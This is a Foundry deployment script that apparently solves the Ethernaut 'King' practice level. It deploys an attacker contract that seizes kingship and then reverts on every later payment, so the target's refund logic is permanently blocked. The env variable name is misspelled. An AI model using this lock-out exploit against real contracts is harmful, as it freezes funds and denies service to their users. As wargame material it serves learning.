// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {King} from "../src/level09/King.sol";

contract Attacker {
    address targetAddr;
    bool locked;
    constructor(address targetAddr_) {
        targetAddr = targetAddr_;
    }

    function attack(uint value) public payable {
        (bool success, ) = targetAddr.call{value: value}("");

        require(success, "claim kingship failed");
    }

    receive() external payable {
        require(!locked, "Never send a wei");
        locked = true;
    }
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_EY");

        // 初始化一个签名者
        vm.startBroadcast(privateKey);

        address levelAddr = 0xDB22a38C8d51dc8CF7bfBbffAb8f618cFE148a04;

        Attacker attacker = new Attacker(levelAddr);

        King target = King(payable(levelAddr));

        // 计算需要给攻击合约至少发送多少 ether
        uint minValue = target.prize() + 1;
        (bool success, ) = address(attacker).call{value: minValue}("");
        require(success, "Failed to send Ether to the attacker contract");

        // 攻击合约发动攻击
        attacker.attack(minValue);

        vm.stopBroadcast();
    }
}
